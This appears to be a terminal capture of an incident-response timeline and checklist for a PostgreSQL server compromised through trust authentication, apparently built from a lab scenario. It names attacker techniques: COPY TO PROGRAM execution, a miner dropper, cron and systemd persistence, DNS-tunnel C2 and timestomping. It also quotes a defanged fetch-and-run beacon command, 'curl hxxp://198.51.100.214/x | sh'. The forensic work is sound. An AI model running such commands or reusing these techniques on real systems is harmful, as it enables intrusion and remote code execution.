[?2004l[?2004h> # Investigation Timeline and Working Checklist
[?2004l[?2004h> 
[?2004l[?2004h> ## Timeline of Events
[?2004l[?2004h> - **Pre-Incidence / Configuration:** PostgreSQL host configured with `trust` authentication method in `/var/lib/pgsql/data/pg_hba.conf`, allowing unauthenticated superuser access from any remote host `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` ``.
[?2004l[?2004h> - **Initial Access:** Threat actor connects from source IP `198.51.100.214` `` `/sas/cti/advisory.txt:5` `` using PostgreSQL valid superuser account (`postgres`) via trust authentication `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` ``.
[?2004l[?2004h> - **Execution:** Attacker leverages PostgreSQL `COPY ... TO PROGRAM` feature `` `/sas/cti/advisory.txt:13` `` to execute shell commands as user `postgres`.
[?2004l[?2004h> - **Payload Drop & Execution:** Dropper planted at `/var/lib/pgsql/.local/pgdaemon` `` `/disk/var/lib/pgsql/.local/pgdaemon:1` `` (logged in `` `/sas/alerts.json:3` ``) configured to write miner/stager payloads connected to mining pool `stratum+tcp://xmr.postgres.evil:3333` `` `/disk/var/lib/pgsql/.local/pgdaemon:2` ``.
[?2004l[?2004h> - **Cron Persistence:** Malicious cron entry created in `/var/spool/cron/postgres` `` `/disk/var/spool/cron/postgres:5` `` executing periodic re-dropper beacon `curl hxxp://198.51.100.214/x | sh` (logged in `` `/sas/alerts.json:11` ``).
[?2004l[?2004h> - **Silent Systemd Persistence:** Malicious systemd service installed at `/etc/systemd/system/pg-metrics.service` `` `/disk/etc/systemd/system/pg-metrics.service:6` `` (omitted from EDR/SAS alerts).
[?2004l[?2004h> - **Silent C2 / DNS Tunneling:** DNS tunnel C2 configured in `/etc/pgdaemon.conf` `` `/disk/etc/pgdaemon.conf:3` `` pointing to domain `update-postgres.example.cn`.
[?2004l[?2004h> - **Defense Evasion / Anti-Forensics:** Attacker backdated file modified times (timestomping) on dropped binaries to match system binaries `` `/disk/var/lib/pgsql/.local/.timestamps:2` `` and attempted log wiping `` `/disk/var/lib/.cache/.wiped.bin:1` ``.
[?2004l[?2004h> - **Discovery & Detection:** EDR alerts generated for `pgdaemon` dropper, `postgres` cron, and `pg_hba.conf` baseline failure `` `/sas/alerts.json:2` ``. Incident intake form opened `` `/sas/handoff/intake.pdf:1` ``.
[?2004l[?2004h> 
[?2004l[?2004h> ## Investigation Checklist
[?2004l[?2004h> - [x] Identify initial compromise vector and credentials used `` `/disk/var/lib/pgsql/data/pg_hba.conf:3` ``
[?2004l[?2004h> - [x] Correlate threat intelligence advisory and indicators `` `/sas/cti/advisory.txt:1` ``
[?2004l[?2004h> - [x] Review EDR alert feed and catalog covered vs. silent findings `` `/sas/alerts.json:1` ``
[?2004l[?2004h> - [x] Detect on-disk droppers and payloads `` `/disk/var/lib/pgsql/.local/pgdaemon:1` ``
[?2004l[?2004h> - [x] Identify cron persistence mechanisms `` `/disk/var/spool/cron/postgres:5` ``
[?2004l[?2004h> - [x] Identify silent systemd persistence mechanisms `` `/disk/etc/systemd/system/pg-metrics.service:6` ``
[?2004l[?2004h> - [x] Identify silent C2 channels and DNS tunnel configuration `` `/disk/etc/pgdaemon.conf:3` ``
[?2004l[?2004h> - [x] Identify anti-forensic timestomping and log wiping evidence `` `/disk/var/lib/pgsql/.local/.timestamps:2` ``
